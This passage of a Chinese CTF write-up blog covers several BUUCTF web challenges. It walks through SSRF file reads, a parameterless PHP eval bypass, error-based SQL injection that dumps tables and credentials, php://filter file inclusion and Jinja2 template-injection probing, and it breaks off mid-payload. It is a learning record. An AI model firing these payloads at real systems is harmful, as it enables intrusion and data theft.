class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getUrl?url=file:<span class="regexp">//</span>suctf.cⓒ<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>nginx<span class="regexp">/conf/</span>nginx.conf</span><br></pre></td></tr></table></figure><br>读取nginx.conf配置文件</p><p>得到了<br>server { listen 80; location / { try_files $uri @app; } location @app { include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; } location /static { alias /app/static; } # location /flag { # alias /usr/fffffflag; # } }</p><p>看到了/usr/fffffflag，接着构造payload<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getUrl?url=file:<span class="regexp">//</span>suctf.cⓒ<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/fffffflag</span></span><br></pre></td></tr></table></figure><br>得到flag</p><h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>打开题目，啥也没有，F12也没有提示，所以考虑一下文件泄露，最后试出来是git泄露，所以直接GitHack下载</p><p>得到index.php的源码<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">echo <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET<span class="literal">['<span class="identifier">exp</span>']</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg<span class="constructor">_match('<span class="operator">/</span><span class="params">data</span>:\<span class="operator">/</span>\<span class="operator">/</span>|<span class="params">filter</span>:\<span class="operator">/</span>\<span class="operator">/</span>|<span class="params">php</span>:\<span class="operator">/</span>\<span class="operator">/</span>|<span class="params">phar</span>:\<span class="operator">/</span>\<span class="operator">/</span><span class="operator">/</span><span class="params">i</span>', $<span class="params">_GET</span>['<span class="params">exp</span>'])</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="character">';'</span><span class="operator"> === </span>preg<span class="constructor">_replace('<span class="operator">/</span>[<span class="params">a</span>-<span class="params">z</span>,<span class="params">_</span>]+\((?R)</span>?\)/', NULL, $_GET<span class="literal">['<span class="identifier">exp</span>']</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg<span class="constructor">_match('<span class="operator">/</span><span class="params">et</span>|<span class="params">na</span>|<span class="params">info</span>|<span class="params">dec</span>|<span class="params">bin</span>|<span class="params">hex</span>|<span class="params">oct</span>|<span class="params">pi</span>|<span class="params">log</span><span class="operator">/</span><span class="params">i</span>', $<span class="params">_GET</span>['<span class="params">exp</span>'])</span>) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @eval($_GET<span class="literal">['<span class="identifier">exp</span>']</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                die(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>可以看到用了三个if还有正则来过滤</p><p>第一个if，看到是过滤了一些协议，看来任意文件读取是没戏了<br>第二个if,?R百度了一下，是引用当前表达式的意思，即a(b())这种类型<br>第三个if，就过滤了一些字符</p><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><p>·git泄露<br>·无参RCE</p><h3 id="无参RCE"><a href="#无参RCE" class="headerlink" title="无参RCE"></a>无参RCE</h3><p>类似于<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><br>表达式只能为a(b())形式的就是无参RCE，即a(XXX)是不合法的</p><p>所以就是说，只能使用函数来达到目的</p><h2 id="测试过程-3"><a href="#测试过程-3" class="headerlink" title="测试过程"></a>测试过程</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">scandir（） </span>  列出 images 目录中的文件和目录</span><br></pre></td></tr></table></figure><p>但是想要得到当前路径，那就得scandir(‘.’)，而有参数是不合法的，所以只能去找函数了</p><p>想不到有啥函数，所以去看了一下WP<br>参考了：<br><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12260986.html</a><br><a href="https://blog.csdn.net/qq_42812036/article/details/104406481" target="_blank" rel="noopener">https://blog.csdn.net/qq_42812036/article/details/104406481</a><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">localeconv</span><span class="params">()</span></span> 函数返回一包含本地数字及货币格式信息的数组</span><br></pre></td></tr></table></figure><br>得到了这样一个函数<br>在本地测试了一下<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">print<span class="constructor">_r(<span class="params">localeconv</span>()</span>);</span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [decimal_point] =&gt; .</span><br><span class="line">    [thousands_sep] =&gt; </span><br><span class="line">    [int_curr_symbol] =&gt; </span><br><span class="line">    [currency_symbol] =&gt; </span><br><span class="line">    [mon_decimal_point] =&gt; </span><br><span class="line">    [mon_thousands_sep] =&gt; </span><br><span class="line">    [positive_sign] =&gt; </span><br><span class="line">    [negative_sign] =&gt; </span><br><span class="line">    [int_frac_digits] =&gt; <span class="number">127</span></span><br><span class="line">    [frac_digits] =&gt; <span class="number">127</span></span><br><span class="line">    [p_cs_precedes] =&gt; <span class="number">127</span></span><br><span class="line">    [p_sep_by_space] =&gt; <span class="number">127</span></span><br><span class="line">    [n_cs_precedes] =&gt; <span class="number">127</span></span><br><span class="line">    [n_sep_by_space] =&gt; <span class="number">127</span></span><br><span class="line">    [p_sign_posn] =&gt; <span class="number">127</span></span><br><span class="line">    [n_sign_posn] =&gt; <span class="number">127</span></span><br><span class="line">    [grouping] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [mon_grouping] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><br>看到了第一个就是.，所以这里用current()函数，来返回这个点</p><p>补充一下函数<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">current</span><span class="params">()</span></span> 返回数组中的当前单元, 默认取第一个值</span><br><span class="line"><span class="function"><span class="title">pos</span><span class="params">()</span></span> current() 的别名</span><br></pre></td></tr></table></figure></p><p>本地测试一下<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">print<span class="constructor">_r(<span class="params">current</span>(<span class="params">localeconv</span>()</span>));</span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.</span><br></pre></td></tr></table></figure><br>发现成功得到了一个.</p><p>所以构造payload<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print<span class="constructor">_r(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)));</span><br></pre></td></tr></table></figure><br>得到了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; . [<span class="number">1</span>] =&gt; .. [<span class="number">2</span>] =&gt; .git [<span class="number">3</span>] =&gt; flag.php [<span class="number">4</span>] =&gt; index.php )</span><br></pre></td></tr></table></figure><br>看到flag.php在第四个位置，想用next()函数套娃，得到flag.php,但是发现不可以，next()函数返回的是数组，不可以套娃</p><p>所以又想到了使用array_reverse()<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">array_reverse</span><span class="params">()</span></span> 函数返回翻转顺序的数组</span><br></pre></td></tr></table></figure><br>反过来之后，再next不就可以了</p><p>想用file_get_contents()函数，但是发现第三个if中ban掉了et，所以找他的替代函数<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">readfile</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">hightlight_file</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><br>这三个函数的意思都差不多，都是获取文件中的内容</p><p>构造payload<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight<span class="constructor">_file(<span class="params">next</span>(<span class="params">array_reverse</span>(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)))));</span><br></pre></td></tr></table></figure></p><p>得到flag</p><h3 id="函数整理"><a href="#函数整理" class="headerlink" title="函数整理"></a>函数整理</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">localeconv</span><span class="params">()</span></span> 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line"><span class="function"><span class="title">scandir</span><span class="params">()</span></span> 列出 images 目录中的文件和目录。</span><br><span class="line"><span class="function"><span class="title">readfile</span><span class="params">()</span></span> 输出一个文件。</span><br><span class="line"><span class="function"><span class="title">current</span><span class="params">()</span></span> 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line"><span class="function"><span class="title">pos</span><span class="params">()</span></span> current() 的别名。</span><br><span class="line"><span class="function"><span class="title">next</span><span class="params">()</span></span> 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"><span class="function"><span class="title">array_reverse</span><span class="params">()</span></span>以相反的元素顺序返回数组。</span><br><span class="line"><span class="function"><span class="title">highlight_file</span><span class="params">()</span></span>打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br></pre></td></tr></table></figure><p>看了WP之后，还发现有几个骚姿势</p><h2 id="姿势补充"><a href="#姿势补充" class="headerlink" title="姿势补充"></a>姿势补充</h2><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用array_flip()和array_rand()来随机读取<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">array_flip</span><span class="params">()</span></span>交换数组的键和值</span><br><span class="line"><span class="function"><span class="title">array_rand</span><span class="params">()</span></span>从数组中随机取出一个或多个单元</span><br></pre></td></tr></table></figure></p><p>payload<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight<span class="constructor">_file(<span class="params">array_rand</span>(<span class="params">array_flip</span>(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)))));</span><br></pre></td></tr></table></figure><br>多刷新几次就可以得到flag了</p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>使用session_id(session_start())</p><p>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。<br>session_id()可以获取到当前的session id。</p><p>因此我们手动设置名为PHPSESSID的cookie，并设置值为flag.php</p><p>[GXYCTF2019]禁止套娃0.png<br><img src="/img/Nepnep/[GXYCTF2019]禁止套娃0.png" alt="avatar"><br><img src="/img/Nepnep/[GXYCTF2019]禁止套娃1.png" alt="avatar"></p><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>还是一样的界面，尝试了一下万能密码和双写注入，发现都不行，经过手工验证发现过滤了空格，union，and,=等多个SQL关键字</p><h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><p>·报错注入</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入常用updatexml()和extractvalue()来利用</p><p>例如<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="string">//localhost/sqli.php</span>?name=' or extractvalue<span class="params">(1,concat(user()</span>,0x7e,<span class="keyword">version</span><span class="params">()</span>)) <span class="comment"># &amp;pass=1</span></span><br><span class="line"></span><br><span class="line">http:<span class="string">//localhost/index.php</span>?name=' or updatexml<span class="params">(1,concat(user()</span>,0x7e,<span class="keyword">version</span><span class="params">()</span>),1) <span class="comment"># &amp;pass=1</span></span><br></pre></td></tr></table></figure></p><p>这个题目由于过滤了空格，但是可以将语句用（）括起来进行绕过空格</p><p>过滤了=，可以使用like来绕过<br><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LIKE</span>  操作符用于在 <span class="keyword">WHERE</span> 子句中搜索列中的指定模式</span><br></pre></td></tr></table></figure></p><p>由于限制了显示的长度，所以可以使用left()和right()函数来拼接flag</p><h2 id="测试过程-4"><a href="#测试过程-4" class="headerlink" title="测试过程"></a>测试过程</h2><p>先查看一下数据库,payload<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure><br>得到了geek</p><p>爆表payload<br><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=<span class="keyword">admin</span>%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(group_concat(<span class="built_in">table_name</span>))<span class="keyword">from</span>(information_schema.<span class="keyword">tables</span>)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="keyword">database</span>())),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span>&amp;<span class="keyword">password</span>=<span class="number">123</span></span><br></pre></td></tr></table></figure><br>得到了H4rDsq1</p><p>爆字段payload<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)where(table_name)like(%<span class="number">27</span>H4rDsq1%<span class="number">27</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure><br>得到了id,username,password</p><p>爆数据payload<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(username,password))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure><br>得到了前半段flag</p><p>使用right()来获取后半段<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(right(password,<span class="number">30</span>)))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure></p><p>拼一下，得到flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ACTF2020-新生赛-BackupFile&quot;&gt;&lt;a href=&quot;#ACTF2020-新生赛-BackupFile&quot; class=&quot;headerlink&quot; title=&quot;[ACTF2020 新生赛]BackupFile&quot;&gt;&lt;/a&gt;[ACTF2020 新生赛]Ba
      
    
    </summary>
    
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
      <category term="WEB" scheme="http://yoursite.com/categories/WP/WEB/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Nepnep" scheme="http://yoursite.com/tags/Nepnep/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-Nepnep-WEB-0</title>
    <link href="http://yoursite.com/2020/05/08/BUUCTF-Nepnep-0/"/>
    <id>http://yoursite.com/2020/05/08/BUUCTF-Nepnep-0/</id>
    <published>2020-05-08T04:14:29.000Z</published>
    <updated>2020-05-11T13:11:51.065Z</updated>
    
    <content type="html"><![CDATA[<p>这是加入Nepnep战队之后的第一次刷题记录,由于要求刷题记录5题一篇文章，所以在这里做出一个改变</p><h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><p>打开环境之后，发现有个链接，点击一下<br><img src="/img/Nepnep/ACTF2020新生赛Include-0.png" alt="avatar"></p><p>点击之后得到这样一个界面，发现URL上有一个file变量，可以判断是使用伪协议来进行来进行文件的读取<br>所以先常规查看一下index.php的内容<br>pyload:<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><br>经过base64转码后得到index.php的代码：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">"utf8"</span>&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr(<span class="variable">$file</span>,<span class="string">"php://input"</span>) || stristr(<span class="variable">$file</span>,<span class="string">"zip://"</span>) || stristr(<span class="variable">$file</span>,<span class="string">"phar://"</span>) || stristr(<span class="variable">$file</span>,<span class="string">"data:"</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>)&#123;</span><br><span class="line">include(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">echo <span class="string">'&lt;a href="?file=flag.php"&gt;tips&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>这段代码还是很简单的，就是利用了stristr函数来对几个常见的伪协议进行搜索，如果搜索到使用了这几个伪协议那就判断为hacker!</p><p>类似于正则，但是没有正则灵活吧</p><p>这里分析看到并没有过滤php://filter，所以直接使用读取flag.php<br>pyload:<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><br>得到flag,属于送分题类型</p><h1 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这个题打开之后是个google搜索，随便在框内输入，然后点击搜索后，在页面看到了我输入的内容，发现没有什么东西，查看源码之后得到了提示：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--ssssssti &amp; a little trick --&gt;</span></span><br></pre></td></tr></table></figure><br>这里不知道是什么意思，在网上搜索了之后发现是ssti注入</p><p>我这里参考了这篇文章<br><a href="https://xz.aliyun.com/t/3679#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679#toc-9</a></p><p>造成模板注入的原因与一般注入相同，都是渲染的模板可以受用户控制且过分相信了用户的输入而造成了模板注入</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>类似于这样的模板：<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"> <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><span class="template-variable">&#123;$what&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>$what会接受用户输入的值，例如用户输入xxx，那么这个模板经过渲染后就会变为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这样就是模板受用户控制</p><h3 id="jiajia2的基本语法"><a href="#jiajia2的基本语法" class="headerlink" title="jiajia2的基本语法"></a>jiajia2的基本语法</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;config&#125;&#125;</span>可以获取当前设置</span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="keyword">self</span>&#125;&#125;</span></span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="keyword">self</span>.__dict__._TemplateReference__context.config&#125;&#125;</span> 同样可以看到config</span><br><span class="line"><span class="template-variable">&#123;&#123;&#125;&#125;</span>为变量</span><br><span class="line">&#123;<span class="comment"># #&#125;为注释</span></span><br><span class="line"><span class="template-variable">&#123;% %&#125;</span>内可以写代码</span><br></pre></td></tr></table></figure><p>另外得知jiajia2貌似是基于flask框架的，所以再补充一下python的知识<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="strong">__class__</span> 返回类型所属的对象</span><br><span class="line"><span class="strong">__subclasses__</span> 返回该对象所在类的子类</span><br><span class="line"><span class="strong">__init__</span> 类的初始化方法</span><br><span class="line"><span class="strong">__globals__</span> 对包含函数全局变量的字典的引用</span><br><span class="line"><span class="strong">__mro__</span> 返回该对象的所有类，包括父类</span><br><span class="line"><span class="strong">__bases__</span> 返回该对象所继承的基类 <span class="strong">__builtins__</span>是做为默认初始模块</span><br></pre></td></tr></table></figure><br>根据这些，以及参考的资料，首先对其进行测试</p><h2 id="测试过程-1"><a href="#测试过程-1" class="headerlink" title="测试过程"></a>测试过程</h2><p>pyload:<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="number">2</span>*<span class="number">2</span>&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="/img/Nepnep/fakegoogle0.png" alt="avatar"></p><p>验证了存在ssti注入<br>首先使用()配合空字符串，加上<strong>class</strong>来查看类<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?<span class="built_in">name</span>=&#123;&#123;().<span class="variable">__class__</span>&#125;&#125;</span><br></pre></td></tr></table></figure><br>得到class ‘tuple’，成功之后在使用_bases_来查看继承的基类<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="literal">()</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>&#125;</span></span>&#125;</span><br></pre></td></tr></table></figure><br>得到确实是所有类的父类<class 'object'></p><p>接下来选中object类，并且使用subclasses返回它的所有子类</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="literal">()</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>].<span class="constructor">__subclasses__()</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>列出了所有子类,这里要找的是OS所在的warnings.catch_warnings类<br>发现在170个，索引就为169<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="literal">()</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>].<span class="constructor">__subclasses__()</span><span class="literal">[<span 